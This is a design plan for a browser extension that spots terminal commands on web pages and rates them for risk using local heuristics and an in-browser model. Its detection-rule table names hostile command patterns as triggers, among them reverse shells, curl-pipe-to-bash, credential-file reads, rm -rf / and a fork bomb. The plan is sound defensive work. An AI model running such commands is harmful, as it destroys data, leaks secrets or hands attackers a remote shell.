# Laya Command Guard — browser extension plan

A Chrome/Edge (Manifest V3) extension that ports the **client-side Laya
evaluation loop** from `client/` into an extension: it watches the page for
terminal commands — in `<code>`/`<pre>` blocks, in the current selection, and in
text copied to the clipboard — and gives instant, in-browser feedback on whether
running that command is safe.

The whole point is the same as the web client: the model runs **locally in the
browser**, no command text ever leaves the machine.

---

## 1. Goal & scope

Ask Laya: *"Is the command being selected or copied to the clipboard from the
current site I'm visiting safe to run?"* and answer with:

- a platform classification (Windows / macOS / Linux / Android / iOS / other)
  derived from the browser agent,
- per-category risk scores: **secret leak**, **reverse shell**, **destructive
  operation**, **privilege escalation**, **download-and-execute**, **data
  exfiltration**, **obfuscation**, **OS applicability**,
- one aggregated verdict (safe / caution / dangerous) with a 0–100 score,
- a floating tooltip when hovering an element that looks like it holds terminal
  commands,
- a console log of **every** attempt (hover, selection, copy, manual).

Out of scope: blocking, rewriting, or executing anything. The extension only
advises.

---

## 2. Why this is a port, not a rewrite

The existing web client already solves the hard part:

| Concern | Existing code | Reuse in extension |
|---|---|---|
| Load Laya WASM runtime | `client/src/main.ts` `loadClientRuntime()` | `extension/src/offscreen.ts` |
| Persist ~340 MB of assets in Cache Storage | `client/src/laya-model-cache.ts` | copied to `extension/src/lib/model-cache.ts` (verbatim, no behavior change) |
| Question → prediction → labels | `makeClientQuestions` / `clientResponse` | `extension/src/lib/questions.ts` + `lib/scoring.ts` |
| Bundle model + wasm | `client/vite.config.ts` `layaWasmAssets()` plugin | `extension/scripts/build.mjs` copies the same files from `client/node_modules` |

The one structural difference: a content script is untrusted, short-lived and
runs once per page, so the ~1 GB runtime must **not** live there. Instead it
lives in a single MV3 **offscreen document** owned by the service worker, and
content scripts talk to it over messaging. That is the extension equivalent of
the client's SharedWorker.

---

## 3. Architecture

```
┌───────────────────────────────────────────────────────────────────┐
│ Page (any site)                                                    │
│  content script (isolated world)                                  │
│   • detect command-like elements / selection / copy               │
│   • instant heuristic verdict                                     │
│   • shadow-DOM tooltip                                             │
│   • console log every attempt                                     │
└───────────────┬───────────────────────────────────────────────────┘
                │ chrome.runtime.sendMessage({type:"evaluate"})
                ▼
┌───────────────────────────────────────────────────────────────────┐
│ MV3 service worker (background.ts)                                │
│   • ensure offscreen document exists                              │
│   • relay requests ⇄ offscreen over a Port named "laya-offscreen" │
│   • own config (chrome.storage.sync) + attempt log (storage.session)│
│   • broadcast load status to content scripts / popup              │
└───────────────┬───────────────────────────────────────────────────┘
                │ long-lived Port
                ▼
┌───────────────────────────────────────────────────────────────────┐
│ Offscreen document (offscreen.html + offscreen.ts)                │
│   • installModelCache(), Laya.load({backend:"wasm"})              │
│   • keep the runtime warm across pages/tabs                       │
│   • predict(state, questions) and return raw answers              │
└───────────────────────────────────────────────────────────────────┘
```

### Why offscreen and not the service worker

MV3 service workers have no DOM/`window` and are killed aggressively; Laya's
WASM backend needs browser globals and must stay loaded. An offscreen document
is a real, headless extension page that persists while it exists, which is
exactly the "keep one runtime alive" behavior the client gets from its
SharedWorker. The background worker only creates it on demand
(`chrome.offscreen.createDocument`) and checks `chrome.offscreen.hasDocument`.

### Why not bundle the model into the page

`web_accessible_resources` would expose the 320 MB model to every site. The
offscreen document is an extension page, so it can fetch
`chrome.runtime.getURL(...)` assets directly — no WAR entry needed — and the
model stays private to the extension origin.

---

## 4. Folder layout

```
extension/
  PLAN.md                     ← this file
  README.md                   ← install/build/privacy notes
  package.json                ← esbuild + typescript + laya-system-one
  tsconfig.json
  .gitignore                  ← dist/, assets/models, assets/wasm
  scripts/
    build.mjs                 ← esbuild bundle + asset copy + manifest emit
  src/
    manifest.json             ← MV3 manifest template (build copies it)
    offscreen.html
    popup.html
    background.ts             ← service worker: relay + config + log
    offscreen.ts              ← Laya runtime host
    content.ts                ← detection + tooltip + clipboard/selection
    popup.ts                  ← status + recent attempts viewer
    lib/
      types.ts                ← shared message/verdict/question types
      platform.ts             ← userAgent → platform + shell hints
      heuristics.ts           ← instant regex/rules risk engine
      questions.ts            ← Laya question set + platform-aware phrasing
      scoring.ts              ← raw Laya answers → per-category + verdict
      detection.ts            ← DOM command detection + extraction
      logger.ts               ← prefixed console + storage.session ring log
      messaging.ts            ← typed wrappers over runtime/port messaging
      tooltip.ts              ← shadow-DOM tooltip renderer
      model-cache.ts          ← copied from client/src/laya-model-cache.ts
  test/
    platform.test.ts
    heuristics.test.ts
    questions.test.ts
    scoring.test.ts           ← run with `bun test`
  assets/                     ← generated, git-ignored
    models/laya/{model.onnx,tokenizer.json,rl_agent_config.json}
    wasm-pkg/{laya_inference.js,laya_inference_bg.wasm}
  dist/                       ← load-unpacked output, git-ignored
```

---

## 5. Detection

`lib/detection.ts` answers "does this look like a terminal command?".

**Candidate elements** (discovered on `mouseover`, debounced 150 ms):

- `code`, `pre`, `kbd`, `samp`, `.highlight`, `.language-bash|shell|sh|zsh|powershell`
- any element whose trimmed text is mostly a single line/block and matches the
  command heuristic.

**Selection**: `selectionchange` (debounced) and `mouseup` — takes
`window.getSelection().toString()`.

**Clipboard**: a `copy` listener reads the selected text before the browser
handles it (no clipboard permission needed for the page's own copy event).

**Extraction rules** (`looksLikeCommand` / `scoreCommandLikeness`):

- strip a leading prompt (`$`, `>`, `PS>`, `#`, `❯`), code-fence markers,
  line numbers, and trailing output;
- reject prose: a candidate must contain a shell-ish token or one of the known
  command names, and must not be a URL/email/HTML;
- cap at `MAX_COMMAND_CHARS` (2048) and `MAX_LINES` (20) before it reaches the
  model, to keep the token budget bounded.

Each candidate gets a `source` tag: `hover` | `selection` | `copy` | `manual`.

---

## 6. Instant heuristic engine (deterministic, no model)

`lib/heuristics.ts` runs **before** the model so the tooltip can render in
milliseconds while Laya warms/answers. It returns `Partial<RiskScores>`
(0–1 per category), a list of `{ id, category, severity, detail, evidence }`
findings, and a `rulesetVersion`.

Rules (non-exhaustive; each has a stable id so logs are greppable):

| id | category | example triggers |
|---|---|---|
| `destructive-rm-root` | destructive | `rm -rf /`, `rm -rf ~`, `rm -rf *`, `--no-preserve-root` |
| `destructive-disk` | destructive | `dd if=`, `mkfs`, `fdisk`, `diskpart`, `format c:` |
| `destructive-fork-bomb` | destructive | `:(){ :|:& };:` |
| `secret-env-dump` | secret-leak | `env`, `printenv`, `set`, `export -p`, `cat .env`, `cat ~/.aws/credentials`, `.npmrc`, `.ssh/id_*` |
| `secret-history` | secret-leak | `cat ~/.bash_history`, `history`, `cat ~/.zsh_history` |
| `secret-curl-auth` | secret-leak | `curl -u`, `-H "Authorization:`, `--token`, `--password`, `-p` with a URL |
| `shell-reverse` | reverse-shell | `/dev/tcp/`, `bash -i >&`, `nc -e`, `ncat -e`, `socat ... exec`, `mkfifo ... | nc`, `python -c '...socket...connect'` |
| `exec-download` | download-execute | `curl ... \| bash`, `wget ... \| sh`, `iwr ... \| iex`, `curl -o- ... \|` |
| `exec-base64` | obfuscation | `base64 -d \| sh`, `echo ... \| base64 -d \| bash`, `-enc`/`-EncodedCommand` |
| `priv-escalation` | privilege-escalation | `sudo su`, `sudo -i`, `runas /user:`, `doas`, `chmod +s`, `su -` |
| `exfil-network` | data-exfiltration | `scp`/`rsync` to a remote, `curl -F file=@`, `nc` upload, `tar ... \| ssh` |
| `persistence` | persistence | `crontab`, `systemctl enable`, `schtasks /create`, `launchctl load`, `~/.bashrc >>` |
| `platform-mismatch` | os-applicability | `powershell`/`Get-ChildItem` on macOS/Linux; `apt` on macOS; `brew`/`launchctl` on Linux; `sudo` on stock Android |

Severity weights live in one table so `scoring.ts` and tests share them.

---

## 7. Model questions (`lib/questions.ts`)

One batched `predict()` call — Laya returns a `Record<string, answer>`, so all
questions are asked at once (the web client only ever asks one; the SDK supports
many). Questions are re-phrased with the detected platform so applicability is
concrete.

```
risk_secret_leak        noul   "Does running this command risk exposing secrets, tokens, passwords, or private keys?"
risk_reverse_shell      noul   "Does this command open or create an interactive remote shell to another machine?"
risk_destructive        noul   "Could this command delete, overwrite, format, or irreversibly damage data or the system?"
risk_privilege_escalation noul "Does this command escalate to administrator/root or bypass OS security controls?"
risk_download_execute   noul   "Does this command download code from the network and immediately execute it?"
risk_data_exfiltration  noul   "Does this command send local files or secrets to a remote destination?"
risk_obfuscation        noul   "Is this command deliberately obfuscated or encoded to hide its behavior?"
os_applicable           noul   "Is this command applicable and valid on <PLATFORM> (for example, does it target the right shell and tools)?"
purpose                 choice ["A normal utility command","File or directory management","Network operation","System administration","Security-sensitive or destructive","Unrecognizable"]
```

`noul` ("yes/no/unknown") is used for risks because the client already maps its
`noul` probability to a boolean-ish decision and confidence — see
`clientResponse()` in `client/src/main.ts`. `purpose` is a `choice` for a
human-readable headline. `maxLen` stays at the client's `1024` token cap.

---

## 8. Scoring (`lib/scoring.ts`)

1. Parse each `noul` answer to `p = probability(true)` (falling back to
   `answer.noul` / `answer.confidence`), and `purpose` to its top choice.
2. `riskScore[category] = max(heuristicScore, modelScore)` — the model can only
   raise a risk the rules already flag, never clear it.
3. `os_applicable` low → add a `platform-mismatch` finding and mark the verdict
   "not applicable here" (informational, not dangerous).
4. Aggregate to a 0–100 danger score with a noisy-OR:
   `danger = 100 * (1 - Π(1 - weight_c * riskScore_c))`, `weight` per category.
5. Verdict thresholds: `< 20` **safe**, `< 55` **caution**, else **dangerous**;
   any single `critical` severity finding forces **dangerous**.
6. Confidence = model `answer_confidence` blended with rule coverage.

The final `Verdict` object (see `lib/types.ts`) carries `level`, `score`,
`categories`, `findings`, `purpose`, `platform`, `engine` (`"heuristic"` or
`"model"`), `timings`, and the raw model probabilities for the debug line.

---

## 9. Platform detection (`lib/platform.ts`)

- Prefer `navigator.userAgentData.platform` when available, fall back to
  `navigator.platform` and `navigator.userAgent`.
- Map to `windows | macos | linux | android | ios | chromeos | other`.
- Derive a `shell` hint (`powershell`, `cmd`, `bash/zsh`, `sh`) from the
  platform, and export the human label used in questions and the tooltip.
- Note: the platform is the **browser's** platform, which is the best available
  proxy for the machine that would run a copied command.

---

## 10. Tooltip UI (`lib/tooltip.ts`)

- Rendered inside a **shadow root** so no site CSS can leak in or out.
- Positioned near the hovered element / selection, flipped when near a viewport
  edge, dismissed on scroll-out, `Escape`, or an 8 s idle timeout.
- States: `checking` (spinner + heuristic-only result + "model refining…"),
  `result` (verdict chip, danger meter, per-category bars, purpose line,
  platform badge, evidence list), `error`.
- Badge text always names the engine: `heuristic` vs `model`.
- All rendering is `textContent`/`createElement` — the page text is never
  interpreted as HTML.

---

## 11. Messaging protocol (`lib/messaging.ts`, `lib/types.ts`)

Content → background:

- `{ type: "evaluate", command, source, url, platform } → { verdict }`
- `{ type: "status" } → { modelState: "cold"|"loading"|"ready"|"error", attempts }`
- `{ type: "log", entry }` (fire-and-forget)

Background → offscreen (Port `laya-offscreen`):

- `{ type: "load" }` / `{ type: "predict", requestId, state, questions }`
- offscreen → background: `{ type: "loaded" }`, `{ type: "prediction", requestId, … }`,
  `{ type: "error", … }`, `{ type: "progress", phase }`

Background keeps one Port, a `Map<requestId, resolve>` and a single in-flight
load promise, mirroring `loadClientRuntime()` in the client so reloads and
multiple tabs share one runtime.

---

## 12. Console logging ("log all attempts")

`lib/logger.ts` writes a `console.info`/`console.warn`/`console.error` line for
every step, prefixed `[laya-guard]`:

```
[laya-guard] attempt #12 source=hover platform=linux chars=27 rules=2 
              "curl -fsSL https://x.sh | sudo bash"
[laya-guard] heuristic verdict level=dangerous score=88 findings=[exec-download,priv-escalation]
[laya-guard] questions {risk_download_execute:…, os_applicable:…}
[laya-guard] model answers {risk_download_execute:{p:0.94}, …} in 412 ms
[laya-guard] final verdict level=dangerous score=91 engine=model
```

Every attempt is also pushed to a `chrome.storage.session` ring buffer
(last 200) that the popup renders, so the console trail survives across pages
and can be inspected without devtools. The logger never logs clipboard content
unless `verbose` is enabled in options (privacy default: log a length + hash
prefix, not the raw command).

---

## 13. Manifest & permissions

```jsonc
{
  "manifest_version": 3,
  "name": "Laya Command Guard",
  "permissions": ["storage", "offscreen"],
  "host_permissions": [],            // no network for inference
  "background": { "service_worker": "background.js", "type": "module" },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_idle",
    "all_frames": false
  }],
  "action": { "default_popup": "popup.html" },
  "web_accessible_resources": []     // model stays inside the extension origin
}
```

No `clipboardRead`, no `scripting`, no remote code, no host permissions.
Content scripts are injected on all URLs but only *read* page text the user
hovers/selects/copies.

---

## 14. Build (`scripts/build.mjs`)

1. Concatenate `@sys-one/laya-model-chunk-00..12/chunk.bin` → `assets/models/laya/model.onnx`
   (same as the Vite plugin).
2. Copy `tokenizer.json`, `rl_agent_config.json`, `wasm-pkg/*` from
   `laya-system-one`.
3. `esbuild` bundles:
   - `background.ts` → `dist/background.js` (ESM, `chrome` global),
   - `offscreen.ts` → `dist/offscreen.js` (ESM),
   - `content.ts` → `dist/content.js` (IIFE — content scripts are not modules),
   - `popup.ts` → `dist/popup.js` (ESM).
4. Copy `manifest.json`, `offscreen.html`, `popup.html`, and the model/wasm
   assets into `dist/`.
5. `--watch` re-runs on src changes.

Load unpacked from `extension/dist`. Model assets are ~340 MB, so `dist/` is
git-ignored and regenerated by the build (documented in the README).

---

## 15. Testing

- `bun test extension/test` — pure logic only (no DOM, no Laya):
  - `platform.test.ts`: UA strings → expected platform/shell.
  - `heuristics.test.ts`: table of commands → expected finding ids and
    categories, including false-positive guards (prose, URLs, flags).
  - `questions.test.ts`: question shape, platform phrasing, `noul`/`choice`
    types, token-bounded extraction.
  - `scoring.test.ts`: answer fixtures → expected level/score, "model cannot
    clear a rule hit", OS-mismatch handling, empty/error answers.
- `bun run typecheck` (tsc `--noEmit`) over `src`.
- `bun run build` must emit a `dist/` with a valid manifest and all assets.
- Manual smoke checklist in the README (load unpacked → open a gist with a
  `rm -rf /` block → hover, select, copy → confirm verdict, tooltip, console).

---

## 16. Milestones

1. Plan (this document).
2. Scaffold: package.json, tsconfig, esbuild build, manifest, assets copy.
3. Pure lib: types, platform, heuristics, questions, scoring, logger (+ tests).
4. Runtime: model-cache, offscreen host, background relay.
5. UI: content detection + tooltip, popup log viewer.
6. Verify: tests, typecheck, build, README, manual checklist.

---

## 17. Risks & limitations

- **Asset size**: the extension ships ~340 MB of model/wasm; unpacked dev is
  fine, store distribution would need a hosted/fetched model instead. The
  runtime loader accepts a `modelBase` override so a remote host can be used.
- **Cold start**: first offscreen load downloads from `chrome-extension://`
  (local, fast) but still builds the WASM pool; the heuristic engine keeps the
  UX instant meanwhile.
- **Platform is the browser's**, not necessarily the machine that will run the
  command; the tooltip says so.
- **Model is advisory**: a "safe" verdict never guarantees safety; heuristics
  and model are shown separately so the user can see which one fired.
- **Laya WASM needs ~1 GB RAM** and can crash a tab (same caveat as the web
  client); the offscreen document isolates that risk from the page.
